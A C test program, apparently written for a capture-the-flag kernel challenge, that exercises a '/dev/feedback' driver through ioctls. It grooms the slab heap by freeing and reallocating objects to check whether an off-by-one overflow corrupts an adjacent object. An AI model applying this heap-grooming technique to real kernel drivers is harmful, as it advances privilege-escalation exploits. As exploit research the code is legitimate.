#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <errno.h>

#define FEEDBACK_IOCTL_CREATE 0x1337
#define FEEDBACK_IOCTL_EDIT 0x1338
#define FEEDBACK_IOCTL_GET 0x1339
#define FEEDBACK_IOCTL_DELETE 0x133A

struct feedback_ioctl_args {
    uint32_t id;
    uint32_t size;
    char *data;
};

int fd;

int create_fb(uint32_t id, uint32_t size, const char *data) {
    struct feedback_ioctl_args args = { .id = id, .size = size, .data = (char *)data };
    return ioctl(fd, FEEDBACK_IOCTL_CREATE, &args);
}

int get_fb(uint32_t id, uint32_t size, char *data) {
    struct feedback_ioctl_args args = { .id = id, .size = size, .data = data };
    return ioctl(fd, FEEDBACK_IOCTL_GET, &args);
}

int delete_fb(uint32_t id) {
    struct feedback_ioctl_args args = { .id = id };
    return ioctl(fd, FEEDBACK_IOCTL_DELETE, &args);
}

#define TARGET_SLAB_SIZE 128
#define NUM_SPRAY 16
#define VICTIM_ID 1000
#define ATTACKER_ID 1001
#define REPLACEMENT_ID 1002

void run_test() {
    char spray_buf[TARGET_SLAB_SIZE];
    char attacker_buf[TARGET_SLAB_SIZE - 1];
    char replacement_buf[TARGET_SLAB_SIZE];
    char check_buf[TARGET_SLAB_SIZE];

    memset(spray_buf, 'A', sizeof(spray_buf));
    memset(attacker_buf, 'B', sizeof(attacker_buf));
    memset(replacement_buf, 'C', sizeof(replacement_buf));

    // 1. Allocate victim
    if (create_fb(VICTIM_ID, TARGET_SLAB_SIZE, spray_buf) < 0) {
        perror("[-] victim create failed");
        return;
    }

    // 2. Allocate attacker (the one that overflows)
    if (create_fb(ATTACKER_ID, sizeof(attacker_buf), attacker_buf) < 0) {
        perror("[-] attacker create failed");
        delete_fb(VICTIM_ID);
        return;
    }

    // 3. Free the victim. This should put it on the freelist.
    // If the allocator is LIFO, the next allocation of this size might get this slot.
    delete_fb(VICTIM_ID);

    // 4. Allocate a replacement object. The hope is that this object
    // lands in the memory previously occupied by the victim, which is
    // right after the attacker object. The overflow from the attacker
    // should corrupt the first byte of this replacement object.
    if (create_fb(REPLACEMENT_ID, sizeof(replacement_buf), replacement_buf) < 0) {
        perror("[-] replacement create failed");
        delete_fb(ATTACKER_ID);
        return;
    }

    // 5. Check for corruption in the replacement object
    memset(check_buf, 0, sizeof(check_buf));
    if (get_fb(REPLACEMENT_ID, sizeof(check_buf), check_buf) < 0) {
        perror("[-] replacement get failed");
    } else {
        if (check_buf[0] != 'C') {
            printf("[+] HIT! Replacement's first byte was corrupted: 0x%02x (expected 'C')\n", (unsigned char)check_buf[0]);
        } else {
            printf("[-] No corruption detected.\n");
        }
    }

    // Cleanup
    delete_fb(ATTACKER_ID);
    delete_fb(REPLACEMENT_ID);
}

int main() {
    sleep(1);
    fd = open("/dev/feedback", O_RDWR);
    if (fd < 0) {
        perror("[-] failed to open device");
        return 1;
    }

    printf("[*] Running free-groom-and-write test...\n");
    run_test();
    printf("[*] Test complete.\n");

    close(fd);
    return 0;
}
